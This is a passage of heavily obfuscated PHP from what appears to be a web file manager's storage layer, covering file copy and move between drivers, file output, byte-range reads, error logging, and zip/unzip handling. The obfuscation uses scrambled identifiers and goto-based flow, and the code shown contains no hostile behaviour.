$D÷†§›†…->{$AçèòˆÛ”}($cç®íó’, $b¬÷×öÑ‰«, $D²Â«Ş¡†Ÿ); } } goto A¯Êè˜ª®; Dæ…·÷‚ ø: $b¡Ò¬¿­º =& $_SERVER[¾÷]; if (!$cç®íó’ || $cç®íó’ == $b¡Ò¬¿­º[18] || !$b¬÷×öÑ‰«) { return !1; } ignore_timeout(); goto D¯ÓƒêÌ†¶; c«™¬‚¾Ã¡: } private static function check($B˜ë¾©¢†ˆ, $AÈ¦ë°Æó—, $f‹ƒ…ƒ®öÀ, &$B¥ò˜¨´Í) { $a«ë¸÷²äô =& $_SERVER[¾÷]; if (self::driverIsSame($B˜ë¾©¢†ˆ, $f‹ƒ…ƒ®öÀ) && $B˜ë¾©¢†ˆ->isFolder($AÈ¦ë°Æó—) && $B˜ë¾©¢†ˆ->isParentOf($AÈ¦ë°Æó—, $B¥ò˜¨´Í)) { show_json(LNG($a«ë¸÷²äô[1026]), !1); } if (!$B˜ë¾©¢†ˆ->exist($AÈ¦ë°Æó—)) { show_json(LNG($a«ë¸÷²äô[114]), !1); } } private static function copyPath($Cœ–õ™»Àº, $F‹ÁÚº¸¨, $AŠ…¶İÛî, $E“‰×ä‰­Á, $c‘†Šª²Óõ, $b…­Í¹¢ëÒ, $FèŸ¯Ú¸š, $dÀÌ´õ»‚ = false) { goto a¥‹À‹Û…Š; cÊ³ÃùŠ‘ß: $FâÛ¶ïÄ¥À = array_merge($e°ĞÑÍ…ÖŠ[$e¢ªğÅØæà[83]], $e°ĞÑÍ…ÖŠ[$e¢ªğÅØæà[84]]); foreach ($FâÛ¶ïÄ¥À as $aØÜø¿†á‡) { $DÀê‚­†× = $aØÜø¿†á‡[$e¢ªğÅØæà[39]] == $e¢ªğÅØæà[201]; $F‹ÁÚº¸¨ = $Cœ–õ™»Àº->getPathInner($aØÜø¿†á‡[$e¢ªğÅØæà[85]]); $Cğ£ñê£§ã = self::copyPath($Cœ–õ™»Àº, $F‹ÁÚº¸¨, $AŠ…¶İÛî, $E“‰×ä‰­Á, $c‘†Šª²Óõ, $b…­Í¹¢ëÒ, $DÀê‚­†×); if (!$Cğ£ñê£§ã) { IO::errorTips($e¢ªğÅØæà[1027] . $F‹ÁÚº¸¨ . $e¢ªğÅØæà[76] . $E“‰×ä‰­Á); } } return $FäÁ¯Óá¯; goto D‹Ç¶ã‚é¹; FÆÆ’é½¹…: $FäÁ¯Óá¯ = $AŠ…¶İÛî->mkdir($AŠ…¶İÛî->getPath($A°Ò°Õ¯¸æ)); $E“‰×ä‰­Á = $AŠ…¶İÛî->getPathInner($FäÁ¯Óá¯); $e°ĞÑÍ…ÖŠ = $Cœ–õ™»Àº->listPath($F‹ÁÚº¸¨, !0); goto cÊ³ÃùŠ‘ß; a¥‹À‹Û…Š: $e¢ªğÅØæà =& $_SERVER[¾÷]; $A§ªª¯õ«ä = $dÀÌ´õ»‚ ? $dÀÌ´õ»‚ : $Cœ–õ™»Àº->pathThis($F‹ÁÚº¸¨); if ($c‘†Šª²Óõ) { $c«ÄÏéèÍ = $AŠ…¶İÛî->fileNameExist($E“‰×ä‰­Á, $A§ªª¯õ«ä); $A§ªª¯õ«ä = $AŠ…¶İÛî->fileNameAuto($E“‰×ä‰­Á, $A§ªª¯õ«ä, $c‘†Šª²Óõ, !$FèŸ¯Ú¸š); $c‘†Šª²Óõ = $c«ÄÏéèÍ ? $c‘†Šª²Óõ : !1; } goto eÒ¸æÉÕ; eÒ¸æÉÕ: if ($FèŸ¯Ú¸š) { return self::copyFile($Cœ–õ™»Àº, $F‹ÁÚº¸¨, $AŠ…¶İÛî, $E“‰×ä‰­Á, $A§ªª¯õ«ä, $b…­Í¹¢ëÒ); } if ($c‘†Šª²Óõ == REPEAT_RENAME_FOLDER) { $c‘†Šª²Óõ = !1; } $A°Ò°Õ¯¸æ = rtrim($E“‰×ä‰­Á, $e¢ªğÅØæà[18]) . $e¢ªğÅØæà[18] . $A§ªª¯õ«ä; goto FÆÆ’é½¹…; D‹Ç¶ã‚é¹: } private static function copyFile($DÄ¼ÄïÈÍá, $BÇ¶ÖØÜõ…, $aºßàï´£Ÿ, $D‡›ô‹À›, $EÄ‚øÈùñ, $C‘Ğ«Œ©Œ) { goto cÈñÄ¼©; E¦Ûùƒö¿°: Hook::trigger($cÜÚ„Ë¸›[1029], $DÄ¼ÄïÈÍá, $BÇ¶ÖØÜõ…, $aºßàï´£Ÿ, $D‡›ô‹À›, $EÄ‚øÈùñ, $b×â˜å“ñ—); if (self::driverIsSame($DÄ¼ÄïÈÍá, $aºßàï´£Ÿ)) { if ($C‘Ğ«Œ©Œ) { $B¶À± È‰ê = $aºßàï´£Ÿ->moveFile($BÇ¶ÖØÜõ…, $D‡›ô‹À›); } else { $B¶À± È‰ê = $aºßàï´£Ÿ->copyFile($BÇ¶ÖØÜõ…, $D‡›ô‹À›); } Hook::trigger($cÜÚ„Ë¸›[1030], $DÄ¼ÄïÈÍá, $BÇ¶ÖØÜõ…, $aºßàï´£Ÿ, $D‡›ô‹À›, $EÄ‚øÈùñ, $B¶À± È‰ê); return $B¶À± È‰ê; } $b±®ÌßÈ“ = TEMP_FILES; goto c³·Öó°É; có‹£á‘…: Hook::trigger($cÜÚ„Ë¸›[1030], $DÄ¼ÄïÈÍá, $BÇ¶ÖØÜõ…, $aºßàï´£Ÿ, $D‡›ô‹À›, $EÄ‚øÈùñ, $B¶À± È‰ê); return $B¶À± È‰ê; goto Eåä¢ÌÌ›®; c³·Öó°É: mk_dir($b±®ÌßÈ“); $E›«é±Øù = $b±®ÌßÈ“ . $b×â˜å“ñ—; $E›«é±Øù = $DÄ¼ÄïÈÍá->download($BÇ¶ÖØÜõ…, $E›«é±Øù); goto e’æìÎ„´; cÈñÄ¼©: $cÜÚ„Ë¸› =& $_SERVER[¾÷]; $D‡›ô‹À› = $aºßàï´£Ÿ->getPath(rtrim($D‡›ô‹À›, $cÜÚ„Ë¸›[18]) . $cÜÚ„Ë¸›[18] . $EÄ‚øÈùñ); $b×â˜å“ñ— = $cÜÚ„Ë¸›[1028] . time() . rand_string(5); goto E¦Ûùƒö¿°; e’æìÎ„´: $E›«é±Øù = $DÄ¼ÄïÈÍá->iconvApp($E›«é±Øù); $B¶À± È‰ê = $aºßàï´£Ÿ->upload($D‡›ô‹À›, $E›«é±Øù, $C‘Ğ«Œ©Œ); self::remove($b±®ÌßÈ“ . $b×â˜å“ñ—); goto có‹£á‘…; Eåä¢ÌÌ›®: } public static function pathFather($F³âŠÓğëæ) { $E‘¨ëÔÜºœ = IO::init($F³âŠÓğëæ); $E‡ÔÎ³Ò¸á = $E‘¨ëÔÜºœ->pathFather($E‘¨ëÔÜºœ->path); return $E‘¨ëÔÜºœ->getPathOuter($E‡ÔÎ³Ò¸á); } public static function fileOut($Aï¶î®Ñ Û, $FŠÛø‰¬Ø = false, $e×“½¤Šù´ = false, $C‘Ì³Ÿç = '') { $cíù‘–‰¦ = self::driverMake($Aï¶î®Ñ Û); if ($cíù‘–‰¦->isFileOutServer()) { return $cíù‘–‰¦->fileOutServer($Aï¶î®Ñ Û, $FŠÛø‰¬Ø, $e×“½¤Šù´, $C‘Ì³Ÿç); } return $cíù‘–‰¦->fileOut($Aï¶î®Ñ Û, $FŠÛø‰¬Ø, $e×“½¤Šù´, $C‘Ì³Ÿç); } public static function fileOutImage($bïŒ®£®÷¶, $cÌƒãÁ­Šõ = 250) { $a ñ‡‹¨Î = array(250, 600, 1200, 3000, 5000); for ($cßÊÂ¿¾¯ = 0; $cßÊÂ¿¾¯ < count($a ñ‡‹¨Î); $cßÊÂ¿¾¯++) { if ($cßÊÂ¿¾¯ == 0 && $cÌƒãÁ­Šõ <= $a ñ‡‹¨Î[$cßÊÂ¿¾¯]) { $cÌƒãÁ­Šõ = $a ñ‡‹¨Î[$cßÊÂ¿¾¯]; break; } else { if ($cÌƒãÁ­Šõ > $a ñ‡‹¨Î[$cßÊÂ¿¾¯ - 1] && $cÌƒãÁ­Šõ <= $a ñ‡‹¨Î[$cßÊÂ¿¾¯]) { $cÌƒãÁ­Šõ = $a ñ‡‹¨Î[$cßÊÂ¿¾¯]; break; } else { if ($cßÊÂ¿¾¯ == count($a ñ‡‹¨Î) - 1 && $cÌƒãÁ­Šõ > $a ñ‡‹¨Î[$cßÊÂ¿¾¯]) { $cÌƒãÁ­Šõ = $a ñ‡‹¨Î[$cßÊÂ¿¾¯]; break; } } } } $bï †ÇÖæ = self::driverMake($bïŒ®£®÷¶); if ($bï †ÇÖæ->isFileOutServer()) { return $bï †ÇÖæ->fileOutImageServer($bïŒ®£®÷¶, $cÌƒãÁ­Šõ); } return $bï †ÇÖæ->fileOutImage($bïŒ®£®÷¶, $cÌƒãÁ­Šõ); } private static function driverIsSame($F»Ìö½ö™ñ, $c±‘Ò­Ûò) { goto Fã¦•‡âš‘; dó™œ‚¯èä: if ($F»Ìö½ö™ñ->pathDriver == $c±‘Ò­Ûò->pathDriver) { return !0; } return !1; goto fñğ…ÍØ‘ñ; dĞá«˜¿• : if ($Fˆåà„™Öä != $FÀ´‹’­¬ó) { return !1; } if ($Fˆåà„™Öä == $fìñÎ÷œçé[716]) { return !0; } if ($Fˆåà„™Öä == $fìñÎ÷œçé[115]) { return !0; } goto dó™œ‚¯èä; Fã¦•‡âš‘: $fìñÎ÷œçé =& $_SERVER[¾÷]; $Fˆåà„™Öä = $F»Ìö½ö™ñ->getType(); $FÀ´‹’­¬ó = $c±‘Ò­Ûò->getType(); goto dĞá«˜¿• ; fñğ…ÍØ‘ñ: } public static function copyUpdate($a…˜ÖÇ¯Ú, $Eğ›•ºë°­) { goto fçø¾÷¨¯Á; fŠ—Šïµ¯â: Hook::trigger($C¹ğˆœ•‚£[1034], $a…˜ÖÇ¯Ú, $Eğ›•ºë°­, $cªÑÕÃùğ); foreach ($céÎÎÚ°é» as $fôÑ“ÉÔ´ö) { IO::mkdir($fôÑ“ÉÔ´ö); } foreach ($A„ÔÜ‚¦ as $fôÑ“ÉÔ´ö) { IO::copy($fôÑ“ÉÔ´ö[$C¹ğˆœ•‚£[1031]], $fôÑ“ÉÔ´ö[$C¹ğˆœ•‚£[1032]], REPEAT_REPLACE); } goto b‰Ÿ¹…‹åå; fÚö†¿Ò„: $f»òµÑÓŒ = self::_listAll($a…˜ÖÇ¯Ú); $c¾¡Ì§¡·‰ = self::_listAll($Eğ›•ºë°­); $A„ÔÜ‚¦ = array(); goto a¾‘Ú¶¢Å; a¾‘Ú¶¢Å: $céÎÎÚ°é» = array(); foreach ($f»òµÑÓŒ as $b²İÏÓ‚À => $fôÑ“ÉÔ´ö) { if (isset($c¾¡Ì§¡·‰[$b²İÏÓ‚À])) { if ($fôÑ“ÉÔ´ö[$C¹ğˆœ•‚£[86]] == 1) { continue; } if ($c¾¡Ì§¡·‰[$b²İÏÓ‚À][$C¹ğˆœ•‚£[87]] == $fôÑ“ÉÔ´ö[$C¹ğˆœ•‚£[87]]) { continue; } } if ($fôÑ“ÉÔ´ö[$C¹ğˆœ•‚£[86]] == 1) { $céÎÎÚ°é»[] = $Eğ›•ºë°­ . $C¹ğˆœ•‚£[18] . $b²İÏÓ‚À; continue; } $C‚ÃÛä„Ôè = strstr(trim($b²İÏÓ‚À, $C¹ğˆœ•‚£[18]), $C¹ğˆœ•‚£[18]) ? get_path_father($b²İÏÓ‚À) : $C¹ğˆœ•‚£[43]; $A„ÔÜ‚¦[] = array($C¹ğˆœ•‚£[1031] => $fôÑ“ÉÔ´ö[$C¹ğˆœ•‚£[85]], $C¹ğˆœ•‚£[1032] => rtrim($Eğ›•ºë°­, $C¹ğˆœ•‚£[18]) . $C¹ğˆœ•‚£[18] . $C‚ÃÛä„Ôè, $C¹ğˆœ•‚£[1033] => $fôÑ“ÉÔ´ö); } $cªÑÕÃùğ = array($C¹ğˆœ•‚£[201] => $A„ÔÜ‚¦, $C¹ğˆœ•‚£[86] => $céÎÎÚ°é»); goto fŠ—Šïµ¯â; fçø¾÷¨¯Á: $C¹ğˆœ•‚£ =& $_SERVER[¾÷]; if (!IO::exist($a…˜ÖÇ¯Ú)) { return !1; } if (!IO::exist($Eğ›•ºë°­)) { IO::mkdir($Eğ›•ºë°­); } goto fÚö†¿Ò„; b‰Ÿ¹…‹åå: } private static function _listAll($A´œ·Ü—³†) { $Bñ×ÔÒíñ =& $_SERVER[¾÷]; $A´œ·Ü—³† = KodIO::clear($A´œ·Ü—³†); $C§Ê ÌÍ› = IO::listAll($A´œ·Ü—³†); foreach ($C§Ê ÌÍ› as &$b¤ß½ÃÉî¸) { $E…ŒŠ¬¾Á¨ = substr($b¤ß½ÃÉî¸[$Bñ×ÔÒíñ[85]], strlen($A´œ·Ü—³†)); $b¤ß½ÃÉî¸[$Bñ×ÔÒíñ[1035]] = trim($E…ŒŠ¬¾Á¨, $Bñ×ÔÒíñ[18]); } unset($b¤ß½ÃÉî¸); return array_to_keyvalue($C§Ê ÌÍ›, $Bñ×ÔÒíñ[1035]); } public static function fileSubstr($A¶ÉôÓŒÚ³, $E¯öÎ©÷™è, $bŒ ÁÑîÛÏ = false) { goto BàÃÚŞÑØ‹; E¶»éÊ‰´­: $cØÙÇ¿× = $E¯öÎ©÷™è; $b÷¦Ä×…‚ò = $bŒ ÁÑîÛÏ; if ($E¯öÎ©÷™è < 0) { $E¯öÎ©÷™è = $Aîë„İê« + $E¯öÎ©÷™è; } goto f¦ØĞ»ö’œ; e‘²ÑìÒÚ: if (!$a¡÷Ü†é§· && $bŒ ÁÑîÛÏ && isset($GLOBALS[$A­õ©Ë¾ˆ—[1038]])) { throw new Exception($GLOBALS[$A­õ©Ë¾ˆ—[1038]][$A­õ©Ë¾ˆ—[1039]]); } return $a¡÷Ü†é§·; goto Aµº÷µ‘ìğ; céòèî—: if ($bŒ ÁÑîÛÏ <= 0) { return $A­õ©Ë¾ˆ—[43]; } if ($E¯öÎ©÷™è < 0 || $E¯öÎ©÷™è >= $Aîë„İê« || $bŒ ÁÑîÛÏ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\145\122\145\x61\x64\x20\145\162\x72\157\162\41\x20\x73\x74\141\162\x74\75{$E¯öÎ©÷™è}\x3b\x6c\145\156\x67\164\150\x3d{$bŒ ÁÑîÛÏ}\73\x20\163\151\172\145\x3d{$Aîë„İê«}\73"); } $a¡÷Ü†é§· = $a‡¯àÆÙŠ->fileSubstr($A¶ÉôÓŒÚ³, $E¯öÎ©÷™è, $bŒ ÁÑîÛÏ); goto e‘²ÑìÒÚ; BàÃÚŞÑØ‹: $A­õ©Ë¾ˆ— =& $_SERVER[¾÷]; $a‡¯àÆÙŠ = self::driverMake($A¶ÉôÓŒÚ³); $Aîë„İê« = $a‡¯àÆÙŠ->size($A¶ÉôÓŒÚ³); goto E¶»éÊ‰´­; f¦ØĞ»ö’œ: if ($bŒ ÁÑîÛÏ === !1) { $bŒ ÁÑîÛÏ = $Aîë„İê« - $E¯öÎ©÷™è; } if ($E¯öÎ©÷™è + $bŒ ÁÑîÛÏ > $Aîë„İê«) { $bŒ ÁÑîÛÏ = $Aîë„İê« - $E¯öÎ©÷™è; } if (!$Aîë„İê« && $a‡¯àÆÙŠ->getType() == $A­õ©Ë¾ˆ—[115] && !$a‡¯àÆÙŠ->exist($A¶ÉôÓŒÚ³)) { throw new Exception($A­õ©Ë¾ˆ—[1036] . LNG($A­õ©Ë¾ˆ—[1037]) . $A­õ©Ë¾ˆ—[901] . get_path_this($A¶ÉôÓŒÚ³) . $A­õ©Ë¾ˆ—[43]); } goto céòèî—; Aµº÷µ‘ìğ: } private static function driverMake(&$dêÉ§Ñî…) { goto C†éĞ·‹ö; C†éĞ·‹ö: $cËÔÖˆï¼¤ =& $_SERVER[¾÷]; $Eç¨·Ö™¿Š = KodIO::parse($dêÉ§Ñî…); if (!self::$driverListSystem) { $dËŒËŒåË‹ = Model($cËÔÖˆï¼¤[725])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($dËŒËŒåË‹, $cËÔÖˆï¼¤[397]); } goto aµ—Ñ«Š‡º; F³šÄµƒÄâ: return $a¢ºĞÔÆáâ; goto F’‡Çö‡äö; aµ—Ñ«Š‡º: if ($Eç¨·Ö™¿Š[$cËÔÖˆï¼¤[39]] == KodIO::KOD_IO && !self::$driverListSystem[$Eç¨·Ö™¿Š[$cËÔÖˆï¼¤[397]]]) { return !1; } $dêÉ§Ñî… = $Eç¨·Ö™¿Š[$cËÔÖˆï¼¤[1040]]; $a¢ºĞÔÆáâ = self::driverGet($Eç¨·Ö™¿Š, $dêÉ§Ñî…); goto F³šÄµƒÄâ; F’‡Çö‡äö: } private static function driverGet($DŒ–ĞŸö­¹, &$f—‹‘•±¥á) { goto DÏÊ‘Ë‘í; D‰‡£—ËĞÒ: if (isset($dĞ™ºÂ³ù±[$bÎ‹Ğ×´Û·[16]][$bÎ‹Ğ×´Û·[1052]])) { $D£‰‰™­¸Æ->pathBase = rtrim($dĞ™ºÂ³ù±[$bÎ‹Ğ×´Û·[16]][$bÎ‹Ğ×´Û·[1052]], $bÎ‹Ğ×´Û·[18]) . $bÎ‹Ğ×´Û·[18]; $f—‹‘•±¥á = $D£‰‰™­¸Æ->pathBase . ltrim($f—‹‘•±¥á, $bÎ‹Ğ×´Û·[18]); } $f—‹‘•±¥á = $D£‰‰™­¸Æ->getPath($f—‹‘•±¥á); if (isset($DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[1024]])) { $f—‹‘•±¥á = $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[1024]]; } goto dœ£Ù´ÖÍ; F›ó‹çï‚ó: $D£‰‰™­¸Æ = self::$driverCache[$bÙšôœß]; $D£‰‰™­¸Æ->pathDriver = $e›–ì¤ó›²; $D£‰‰™­¸Æ->pathBase = $bÎ‹Ğ×´Û·[43]; goto D‰‡£—ËĞÒ; dœ£Ù´ÖÍ: $D£‰‰™­¸Æ->path = $f—‹‘•±¥á; return $D£‰‰™­¸Æ; goto eÓç½ƒòÎ; d‚£‡ËªÌœ: switch ($DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[39]]) { case KodIO::KOD_IO: $dĞ™ºÂ³ù± = self::$driverListSystem[$e¢îÄ‹ˆ¹…]; break; case KodIO::KOD_SOURCE: $f—‹‘•±¥á = $e¢îÄ‹ˆ¹… . $f—‹‘•±¥á; $dĞ™ºÂ³ù± = array($bÎ‹Ğ×´Û·[1042] => $bÎ‹Ğ×´Û·[1043], $bÎ‹Ğ×´Û·[16] => $DŒ–ĞŸö­¹); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $b«Ù¢˜Ÿìç = $GLOBALS[$bÎ‹Ğ×´Û·[1044]]; self::$driverListUser = array_to_keyvalue($b«Ù¢˜Ÿìç, $bÎ‹Ğ×´Û·[397]); } $dĞ™ºÂ³ù± = self::$driverListUser[$e¢îÄ‹ˆ¹…]; break; case KodIO::KOD_SHARE_LINK: $dĞ™ºÂ³ù± = array($bÎ‹Ğ×´Û·[1042] => $bÎ‹Ğ×´Û·[1045], $bÎ‹Ğ×´Û·[16] => $DŒ–ĞŸö­¹); $AƒÊ¹±âÁˆ = Action($bÎ‹Ğ×´Û·[1046])->sharePathInfo($DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[85]]); $f—‹‘•±¥á = $AƒÊ¹±âÁˆ[$bÎ‹Ğ×´Û·[399]]; if (!$AƒÊ¹±âÁˆ[$bÎ‹Ğ×´Û·[399]]) { $e…¦ØÊˆÜ‚ = Model($bÎ‹Ğ×´Û·[567])->getInfo($AƒÊ¹±âÁˆ[$bÎ‹Ğ×´Û·[471]]); $f—‹‘•±¥á = KodIO::clear($e…¦ØÊˆÜ‚[$bÎ‹Ğ×´Û·[1047]] . $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[1040]]); $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[469]] = $e…¦ØÊˆÜ‚; $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[1024]] = $f—‹‘•±¥á; $dĞ™ºÂ³ù± = array($bÎ‹Ğ×´Û·[1042] => $bÎ‹Ğ×´Û·[1048], $bÎ‹Ğ×´Û·[16] => $DŒ–ĞŸö­¹); } break; case KodIO::KOD_SHARE_ITEM: $dĞ™ºÂ³ù± = array($bÎ‹Ğ×´Û·[1042] => $bÎ‹Ğ×´Û·[1049], $bÎ‹Ğ×´Û·[16] => $DŒ–ĞŸö­¹); $e…¦ØÊˆÜ‚ = Model($bÎ‹Ğ×´Û·[567])->getInfo($DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[397]]); if ($e…¦ØÊˆÜ‚[$bÎ‹Ğ×´Û·[399]] == $bÎ‹Ğ×´Û·[500]) { $f—‹‘•±¥á = KodIO::clear($e…¦ØÊˆÜ‚[$bÎ‹Ğ×´Û·[1047]] . $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[1040]]); $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[469]] = $e…¦ØÊˆÜ‚; $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[1024]] = $f—‹‘•±¥á; $dĞ™ºÂ³ù± = array($bÎ‹Ğ×´Û·[1042] => $bÎ‹Ğ×´Û·[1050], $bÎ‹Ğ×´Û·[16] => $DŒ–ĞŸö­¹); } else { if (!$f—‹‘•±¥á) { $f—‹‘•±¥á = $e…¦ØÊˆÜ‚[$bÎ‹Ğ×´Û·[399]]; } } break; default: $f—‹‘•±¥á = $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[85]]; $dĞ™ºÂ³ù± = array($bÎ‹Ğ×´Û·[1042] => $bÎ‹Ğ×´Û·[1051]); break; } $bÙšôœß = $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[85]]; if (!isset(self::$driverCache[$bÙšôœß])) { $AÁºšà—Æ = strtolower($dĞ™ºÂ³ù±[$bÎ‹Ğ×´Û·[103]]); $B¨ô¡ã“Ş = $GLOBALS[$bÎ‹Ğ×´Û·[16]][$bÎ‹Ğ×´Û·[97]][$bÎ‹Ğ×´Û·[777]]; $a“éË¹‹Ñâ = $bÎ‹Ğ×´Û·[81] . (isset($B¨ô¡ã“Ş[$AÁºšà—Æ]) ? $B¨ô¡ã“Ş[$AÁºšà—Æ] : ucfirst($AÁºšà—Æ)); if (!class_exists($a“éË¹‹Ñâ)) { show_json("{$a“éË¹‹Ñâ}\x20\x6e\x6f\x74\40\145\170\151\163\164\163\x21", !1); } $BÀ¶Š’‚çõ = isset($dĞ™ºÂ³ù±[$bÎ‹Ğ×´Û·[16]]) ? $dĞ™ºÂ³ù±[$bÎ‹Ğ×´Û·[16]] : !1; self::$driverCache[$bÙšôœß] = new $a“éË¹‹Ñâ($BÀ¶Š’‚çõ); } goto F›ó‹çï‚ó; DÏÊ‘Ë‘í: $bÎ‹Ğ×´Û· =& $_SERVER[¾÷]; $e›–ì¤ó›² = $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[1041]]; $e¢îÄ‹ˆ¹… = $DŒ–ĞŸö­¹[$bÎ‹Ğ×´Û·[397]]; goto d‚£‡ËªÌœ; eÓç½ƒòÎ: } public static function errorTips($a¹…î±àŠ¿ = false) { goto d‹ÁáÓÛ©ë; dà˜É©£³¡: $f®Ú˜ºã®´[] = $a¹…î±àŠ¿; write_log($aÅ‰ãî×Ó[169] . ACTION . $aÅ‰ãî×Ó[1053] . $a¹…î±àŠ¿, $aÅ‰ãî×Ó[1054]); goto E‘£œÈ»ÛÚ; d‹ÁáÓÛ©ë: $aÅ‰ãî×Ó =& $_SERVER[¾÷]; static $f®Ú˜ºã®´ = array(); $Aøò¿”© = 1000; goto eëÂŒ¥¶ƒ¹; eëÂŒ¥¶ƒ¹: if ($a¹…î±àŠ¿ === -1) { return $f®Ú˜ºã®´ ? $f®Ú˜ºã®´[count($f®Ú˜ºã®´) - 1] : $aÅ‰ãî×Ó[43]; } if ($a¹…î±àŠ¿ === !1) { return implode($aÅ‰ãî×Ó[9], $f®Ú˜ºã®´); } if (count($f®Ú˜ºã®´) >= $Aøò¿”©) { $f®Ú˜ºã®´ = array_slice($f®Ú˜ºã®´, $Aøò¿”© * 0.5, $Aøò¿”©); } goto dà˜É©£³¡; E‘£œÈ»ÛÚ: } public static function getLastError($Dºœ•éƒì÷ = '') { $fßƒ±›Ï = self::errorTips(-1); return $fßƒ±›Ï ? $fßƒ±›Ï : $Dºœ•éƒì÷; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Fò›§Õ²ôã; if (!$Fò›§Õ²ôã) { $E‚†âôÃĞ¼ = IO::init($_SERVER[¾÷][18]); } return $E‚†âôÃĞ¼; } private static function iconvSystem($a×Ä–Öé) { return self::local()->iconvSystem($a×Ä–Öé); } private static function iconvApp($d¢ğ´Æåô¿) { return self::local()->iconvApp($d¢ğ´Æåô¿); } public static function zip($c…­½Ö…¤, $e„èõÓ¬¶À = "\172\151\x70", $e½¥ÑÒƒÊ = '', $D×›ÓçíÂè = REPEAT_RENAME) { goto fóÎÛÈäÔ; fùÀŸ÷Íµ: $C·ª‘Ö  = $bšÜÌÍµæ . $CâäÏîí . $cÃÔœçö[104] . $e„èõÓ¬¶À; $C·ª‘Ö  = get_filename_auto($C·ª‘Ö , $cÃÔœçö[43], $D×›ÓçíÂè); $fĞ„íÑåÙ× = self::iconvSystem($C·ª‘Ö ); goto c“ÛÍÃÕÚº; B¼“Éòçô­: if ($e½¥ÑÒƒÊ || !$F¿ÕË†”) { if ($F¿ÕË†” && strstr($F¿ÕË†”, TEMP_FILES)) { $cÁòõÄŠ¯‹ = $C¬¥·ˆ°¦Ñ = array(); recursion_dir($bšÜÌÍµæ, $cÁòõÄŠ¯‹, $C¬¥·ˆ°¦Ñ, 0); foreach ($cÁòõÄŠ¯‹ as $DÊáãàÄ¶) { del_dir($DÊáãàÄ¶); } foreach ($C¬¥·ˆ°¦Ñ as $cÄö³ºÉ¦š) { if ($cÄö³ºÉ¦š == $fĞ„íÑåÙ×) { continue; } del_file($cÄö³ºÉ¦š); } } return $C·ª‘Ö ; } $dÒ¤µÆ—Î = self::pathFather($e×ë ¯ªø[$cÃÔœçö[85]]); $b½ÃÇ°„ª¤ = self::move($C·ª‘Ö , $dÒ¤µÆ—Î, $D×›ÓçíÂè); goto a˜‘¥Ú­ö; fóÎÛÈäÔ: $cÃÔœçö =& $_SERVER[¾÷]; $bÏœ«Œ† = self::init($c…­½Ö…¤[0][$cÃÔœçö[85]]); $e×ë ¯ªø = self::info($c…­½Ö…¤[0][$cÃÔœçö[85]]); goto dËãÜˆ; dËãÜˆ: $F¿ÕË†” = !1; if (!$e½¥ÑÒƒÊ && $bÏœ«Œ†->getType() == $cÃÔœçö[115]) { $C¬¥·ˆ°¦Ñ = self::zipFileList($c…­½Ö…¤); } else { $F¿ÕË†” = $e½¥ÑÒƒÊ ? $e½¥ÑÒƒÊ : TEMP_FILES . $cÃÔœçö[1055] . time() . rand_string(8) . $cÃÔœçö[18]; mk_dir($F¿ÕË†”); $C¬¥·ˆ°¦Ñ = self::zipFileList($c…­½Ö…¤, $F¿ÕË†”); } $CâäÏîí = $e×ë ¯ªø[$cÃÔœçö[38]]; goto Eğ§æË†; a˜‘¥Ú­ö: if (!$b½ÃÇ°„ª¤) { del_dir($F¿ÕË†”); show_json(LNG($cÃÔœçö[1057]), !1); } del_dir($F¿ÕË†”); return $b½ÃÇ°„ª¤; goto fÂæéêäë‹; c“ÛÍÃÕÚº: foreach ($C¬¥·ˆ°¦Ñ as $e¯ôÄ¦Œ => $Eô˜ÇÏöĞĞ) { $C¬¥·ˆ°¦Ñ[$e¯ôÄ¦Œ] = self::iconvSystem($Eô˜ÇÏöĞĞ); } KodArchive::create($fĞ„íÑåÙ×, $C¬¥·ˆ°¦Ñ); if (!IO::exist($C·ª‘Ö )) { if ($F¿ÕË†”) { del_dir($F¿ÕË†”); } show_json(LNG($cÃÔœçö[1057]), !1); } goto B¼“Éòçô­; Eğ§æË†: if (count($C¬¥·ˆ°¦Ñ) > 1) { $Eó³Ò®Œé˜ = IO::info(IO::pathFather($e×ë ¯ªø[$cÃÔœçö[85]])); $CâäÏîí = $Eó³Ò®Œé˜[$cÃÔœçö[38]]; } $bšÜÌÍµæ = $F¿ÕË†”; if (!$bšÜÌÍµæ) { $bšÜÌÍµæ = get_path_father($e×ë ¯ªø[$cÃÔœçö[85]]); if (!$e½¥ÑÒƒÊ && $bÏœ«Œ†->getType() == $cÃÔœçö[115]) { $bšÜÌÍµæ = get_path_father($bÏœ«Œ†->path); } $B¿®øÆ°‹­ = IO::info($bšÜÌÍµæ); if (!$B¿®øÆ°‹­[$cÃÔœçö[204]]) { show_json(LNG($cÃÔœçö[1056]), !1); } } goto fùÀŸ÷Íµ; fÂæéêäë‹: } public static function unzip($c“à½µ“‡, $EšŠÊ‰×Ìè = "\162\x65\160\154\x61\143\x65") { goto fŠõ§•áÈ; b‹¸¶µË‚Ö: return !0; goto dºê‘÷Š•÷; aîã¡óÔòß: mk_dir($c½ùºïÑˆ); $E“Ã¢×²ç„ = self::fileExt($cËîÄ´Ãù); $Fô™óÅËç = $c½ùºïÑˆ . $f×¬§öÃßß[104] . $E“Ã¢×²ç„; goto a“½†‡ÛÔÖ; fŠõ§•áÈ: $f×¬§öÃßß =& $_SERVER[¾÷]; $FİÃ’Õ–ê = $c“à½µ“‡[$f×¬§öÃßß[85]]; $c†ö è¥ˆÊ = $c“à½µ“‡[$f×¬§öÃßß[1058]]; goto BíØ—£»í¼; A§¨ôêŸ»Ÿ: $e¬‡ ÛÀ™ = self::tmpFileName($cËîÄ´Ãù); $c½ùºïÑˆ = 